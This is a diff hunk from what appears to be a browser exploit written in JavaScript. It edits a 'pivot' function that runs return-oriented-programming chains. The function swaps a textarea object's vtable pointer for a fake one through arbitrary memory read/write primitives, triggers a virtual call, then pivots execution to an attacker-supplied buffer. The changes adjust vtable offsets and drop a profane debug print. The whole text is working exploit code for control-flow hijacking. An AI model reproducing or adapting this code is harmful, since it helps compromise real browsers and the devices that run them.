@@ -70,18 +70,16 @@ This function is used to execute ROP chains. `buf` is an address of the start of
 function pivot(buf)
 {
     var ans = malloc(0x400);
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    for(var i = 0; i < 0x400; i += 8)
-        write_mem(fake_vtable+i, 0);
-    write_ptr_at(fake_vtable+0x1d8, 0 /*saveall_addr*/);
+    var bak = read_ptr_at(fake_vtable+0x1c8/*0x1d8*/);
+    write_ptr_at(fake_vtable+0x1c8/*0x1d8*/, saveall_addr);
+    //write_ptr_at(fake_vt_ptr, 1);
     write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
     tarea.scrollLeft = 0;
-    print("fuck");
     write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
     write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
+    var bak = read_ptr_at(fake_vtable+0x1c8/*0x1d8*/);
+    write_ptr_at(fake_vtable+0x1c8/*0x1d8*/, pivot_addr);
     write_ptr_at(fake_vt_ptr+0x38, buf);
     write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
     write_ptr_at(buf, ans);
